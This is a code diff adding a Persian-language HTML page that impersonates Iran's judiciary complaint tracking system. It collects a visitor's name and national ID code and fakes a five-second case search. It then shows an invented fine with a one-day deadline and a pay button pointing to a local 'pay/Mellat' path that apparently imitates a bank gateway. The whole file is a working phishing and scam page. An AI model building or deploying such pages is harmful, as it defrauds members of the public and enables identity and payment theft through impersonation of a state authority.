@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سامانه پیگیری شکایات</title>
+    <style>
+        @font-face {
+            font-family: 'CustomFont';
+            src: url('font/cc.ttf') format('truetype');
+        }
+
+        body {
+            font-family: 'IranFont', sans-serif;
+            direction: rtl;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .header img {
+            width: 80px;
+            margin-bottom: 10px;
+        }
+
+        .title {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .tabs img {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+            position: relative;
+            text-align: right;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 5px;
+            margin-right: 5px;
+        }
+
+        .input-group input {
+            width: calc(100% - 50px);
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 20px;
+            font-size: 14px;
+            padding-right: 40px;
+        }
+
+        .input-group img {
+            position: absolute;
+            right: 10px;
+            top: 71%;
+            transform: translateY(-50%);
+            width: 25px;
+        }
+
+        .btn-next {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .btn-next img {
+            width: 70%;
+            cursor: pointer;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .popup {
+            background-color: white;
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            width: 300px;
+            opacity: 0;
+            transform: scale(0.5);
+            animation: showPopup 0.7s forwards;
+            font-family: 'CustomFont', sans-serif;
+        }
+
+        @keyframes showPopup {
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .finding-case span {
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0;
+            }
+        }
+
+        .final-popup {
+            display: none;
+        }
+
+        .final-popup-content {
+            font-size: 14px;
+            text-align: right;
+            margin-top: 20px;
+        }
+
+        .pay-btn img {
+            width: 100%;
+            cursor: pointer;
+        }
+
+    </style>
+
+    <script>
+        function validateMeliCode() {
+            // نمایش overlay و پنجره اول
+            document.querySelector('.overlay').style.display = 'flex';
+            document.querySelector('.finding-case').style.display = 'block';
+
+            // بعد از ۵ ثانیه پنجره دوم را نمایش می‌دهیم
+            setTimeout(() => {
+                document.querySelector('.finding-case').style.display = 'none';
+                document.querySelector('.final-popup').style.display = 'block';
+            }, 5000);
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="im/logo.png" alt="لوگو">
+        </div>
+
+        <div class="title">سامانه مرکزی پیگیری شکایات قوه قضائیه</div>
+
+        <div class="tabs">
+            <img src="im/pan1.png" alt="تب‌ها">
+        </div>
+
+        <div class="input-group">
+            <label for="name">نام و نام خانوادگی</label>
+            <input type="text" id="name" placeholder="نام و نام خانوادگی خود را وارد کنید">
+            <img src="im/gg.png" alt="icon">
+        </div>
+
+        <div class="input-group">
+            <label for="id">کد ملی</label>
+            <input type="text" id="id" placeholder="کد ملی">
+            <img src="im/gg2.png" alt="icon">
+        </div>
+
+        <div class="btn-next">
+            <img src="im/next.png" alt="ادامه" onclick="validateMeliCode()">
+        </div>
+    </div>
+
+    <div class="overlay">
+        <div class="popup finding-case">
+            <span>درحال یافتن پرونده شما <br> لطفا شکیبا باشید</span>
+        </div>
+
+        <div class="popup final-popup">
+            <div>پرونده 1400484842 در شعبه 102</div>
+            <div class="final-popup-content">
+                ثبت کننده : اتابک ***<br>
+                زمان صدور شکایت : 1403/6/27<br>
+                موضوع : درگیری<br>
+                حکم : شما مبلغ 2,000 هزار تومان به علت پرداخت نکردن جرایم درگیری به مدت بالا جریمه شدید<br>
+                مهلت واریز 2,000 تومان فقط فقط 1 روز است<br>
+                نیز شما میتوانید از طریغ دکمه زیر پرداخت نموده و سپس در شعبه 102 اقدام به پیگیری نمایید.
+            </div>
+            <div class="pay-btn">
+                <a href="pay/Mellat"><img src="im/pay.png" alt="پرداخت"></a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
